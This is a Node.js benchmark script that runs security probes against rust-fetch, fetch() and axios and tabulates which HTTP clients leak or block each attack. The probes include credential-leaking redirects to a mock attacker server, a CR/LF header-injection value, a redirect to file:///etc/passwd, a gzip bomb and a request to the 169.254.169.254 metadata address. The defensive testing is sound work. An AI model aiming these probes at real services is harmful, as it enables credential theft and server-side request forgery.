// Runs the probes from wasm-module/js/test/security.test.mjs against
// rust-fetch, Node's fetch() and axios, each in its own process, and prints
// a Markdown table. Each client is used with the protections it offers turned
// on (rust-fetch's allowAbsoluteUrls, maxResponseBytes and
// allowPrivateNetwork; axios's allowAbsoluteUrls and maxContentLength), and
// without them where that's its default.
// Usage: npm run build && npm run security:compare
import { execFile } from 'node:child_process';
import http from 'node:http';
import zlib from 'node:zlib';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';

if (process.env.PROBE) {
  // --- In a child process: run every probe with one client -------------------------
  const { client, api, attacker } = JSON.parse(process.env.PROBE);
  const SECRETS = { authorization: 'Bearer SECRET', cookie: 'sid=SECRET', 'proxy-authorization': 'Basic SECRET' };
  let get;
  if (client === 'rust-fetch') {
    const { WasmClient } = await import(new URL('../wasm-module/pkg/node.js', import.meta.url).href);
    const make = (options) => new WasmClient({ timeoutMs: 3000, ...options });
    get = async (url, { headers = {}, baseUrl, guarded, limit } = {}) => {
      const c = make({ baseUrl, headers: { ...SECRETS, ...headers }, ...(guarded ? { allowAbsoluteUrls: false, allowPrivateNetwork: false } : {}), ...(limit ? { maxResponseBytes: limit } : {}) });
      const res = await c.get(url, { responseType: 'binary' });
      return res.body.length;
    };
  } else if (client === 'fetch()') {
    get = async (url, { headers = {}, baseUrl } = {}) => {
      const target = baseUrl && !/^[a-z]+:/i.test(url) ? baseUrl + url : url;
      const res = await fetch(target, { headers: { ...SECRETS, ...headers }, signal: AbortSignal.timeout(3000) });
      return (await res.arrayBuffer()).byteLength;
    };
  } else {
    const { default: axios } = await import('axios');
    get = async (url, { headers = {}, baseUrl, guarded, limit } = {}) => {
      const c = axios.create({ baseURL: baseUrl, headers: SECRETS, timeout: 3000, ...(guarded ? { allowAbsoluteUrls: false } : {}), ...(limit ? { maxContentLength: limit } : {}) });
      const res = await c.get(url, { headers, responseType: 'arraybuffer' });
      return res.data.byteLength;
    };
  }
  const report = async () => (await (await globalThis.fetch(attacker + '/report')).json()).leaked;
  const reset = () => globalThis.fetch(attacker + '/reset');
  const outcome = (promise) => promise.then(() => 'sent', (e) => 'rejected: ' + String(e.message).slice(0, 50));
  const results = {};

  await reset();
  await get(`${api}/redirect?to=${encodeURIComponent(attacker.replace('127.0.0.1', 'localhost') + '/collect')}`).catch(() => {});
  results.redirect = (await report()).length ? `**leaked ${(await report()).join(', ')}**` : 'dropped';

  const crlf = await outcome(get(`${api}/echo`, { headers: { 'x-a': 'v\r\nx-injected: 1' } }));
  results.crlf = crlf.startsWith('rejected') ? 'rejected' : 'not rejected (axios strips CR/LF from the value)';

  // fetch() has no base URL, so the base-URL probes don't apply to it
  if (client !== 'fetch()') {
    await reset();
    const host = new URL(attacker).host;
    for (const path of [`//${host}/x`, `/\\${host}/x`]) await get(path, { baseUrl: `${api}/v1` }).catch(() => {});
    results.relative = (await report()).length ? '**left the base host**' : 'stayed on the base host';

    await reset();
    await get(`${attacker}/collect`, { baseUrl: `${api}/v1` }).catch(() => {});
    results.absoluteDefault = (await report()).length ? '**sent credentials**' : 'blocked';
    await reset();
    await get(`${attacker}/collect`, { baseUrl: `${api}/v1`, guarded: true }).catch(() => {});
    results.absoluteGuarded = (await report()).length ? '**sent credentials**' : 'blocked';
  }

  results.fileRedirect = (await outcome(get(`${api}/redirect?to=${encodeURIComponent('file:///etc/passwd')}`))).startsWith('rejected') ? 'refused' : '**followed**';

  const before = process.memoryUsage().rss;
  const bombed = await outcome(get(`${api}/bomb`, { limit: client === 'fetch()' ? undefined : 1024 * 1024 }));
  const grew = Math.round((process.memoryUsage().rss - before) / 1e6);
  results.bomb = `${bombed.startsWith('rejected') ? 'rejected' : '**accepted**'}, +${grew} MB`;

  const ssrf = await outcome(get('http://169.254.169.254/latest/meta-data/', { guarded: true }));
  results.ssrf = /Blocked/.test(ssrf) ? 'blocked before connecting' : '**attempted** (no built-in check)';

  console.log(JSON.stringify(results));
  process.exit(0);
}

// --- Coordinator: servers, one child process per client, and the table ---------------
const leaked = [];
const attacker = http.createServer((req, res) => {
  if (req.url === '/report') return res.end(JSON.stringify({ leaked: [...new Set(leaked)] }));
  if (req.url === '/reset') {
    leaked.length = 0;
    return res.end('{}');
  }
  for (const name of ['authorization', 'cookie', 'proxy-authorization']) if (req.headers[name]) leaked.push(name);
  res.end('{}');
});
const bomb = zlib.gzipSync(Buffer.alloc(256 * 1024 * 1024));
const api = http.createServer((req, res) => {
  const url = new URL(req.url, 'http://x');
  if (url.pathname === '/redirect') {
    res.writeHead(302, { location: url.searchParams.get('to') });
    return res.end();
  }
  if (url.pathname === '/bomb') {
    res.writeHead(200, { 'content-type': 'application/octet-stream', 'content-encoding': 'gzip' });
    return res.end(bomb);
  }
  res.end('{}');
});
await new Promise((resolve) => attacker.listen(0, '127.0.0.1', resolve));
await new Promise((resolve) => api.listen(0, '127.0.0.1', resolve));
const urls = { api: `http://127.0.0.1:${api.address().port}`, attacker: `http://127.0.0.1:${attacker.address().port}` };

const columns = {};
for (const client of ['rust-fetch', 'fetch()', 'axios']) {
  try {
    const { stdout } = await promisify(execFile)(process.execPath, [fileURLToPath(import.meta.url)], {
      env: { ...process.env, PROBE: JSON.stringify({ client, ...urls }) },
      timeout: 120_000,
    });
    columns[client] = JSON.parse(stdout.trim().split('\n').pop());
  } catch (error) {
    columns[client] = { error: String(error.message).slice(0, 80) };
  }
}
attacker.close();
api.close();

const rows = [
  ['redirect', 'Credentials on a cross-origin redirect'],
  ['crlf', 'CR/LF in a header value'],
  ['relative', 'Path tricks with a base URL (`//host`, `/\\host`)'],
  ['absoluteDefault', 'Absolute URL with a base URL, by default'],
  ['absoluteGuarded', 'Absolute URL with a base URL, protection on'],
  ['fileRedirect', 'Redirect to `file:`'],
  ['bomb', '256 MB gzip bomb (1 MB limit where available)'],
  ['ssrf', 'Request to `169.254.169.254` (SSRF check where available)'],
];
const names = Object.keys(columns);
console.log(`Node.js ${process.versions.node}\n`);
console.log(`| Probe | ${names.join(' | ')} |`);
console.log(`| --- |${names.map(() => ' --- |').join('')}`);
for (const [key, label] of rows) console.log(`| ${label} | ${names.map((n) => columns[n][key] ?? (columns[n].error ? 'error' : 'n/a')).join(' | ')} |`);
